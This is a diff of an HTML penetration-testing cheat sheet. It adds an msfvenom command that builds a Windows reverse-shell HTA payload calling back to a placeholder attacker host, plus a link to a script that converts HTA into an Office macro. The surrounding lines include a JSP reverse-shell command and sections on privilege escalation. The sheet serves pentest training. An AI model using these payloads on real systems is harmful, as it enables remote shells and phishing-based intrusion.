@@ -44,6 +44,10 @@
 <p id="info">JSP Payload</p>
 <p id="codebox">msfvenom -p java/jsp_shell_reverse_tcp LHOST=$KALIIP LPORT=$KALIPORT -f raw > shell.jsp</p>
 
+<p id="info">HTA Payload</p>
+<p id="codebox">sudo msfvenom -p windows/shell_reverse_tcp LHOST=KALIIP LPORT=KALIPORT -f hta-psh -o evil.hta</p>
+
+
 <h1>Ports</h1>
 <h2>SMB - TCP/445</h2>
 <p id="info">List shares</p>
@@ -109,5 +113,13 @@
 <p id="codebox"><a href="https://sohvaxus.github.io/content/winxp-sp1-privesc.html">Guide to Exploit</a></p>
 
 <h2>Bypass UAC</h2>
+
+
+
+<h1>Macro Attacks</h1>
+<p id="codebox"><a href="/Scripts/Windows/Macros/macro.py">Turn hta into macro</a></p>
+
+
+
 </body>
 </html>
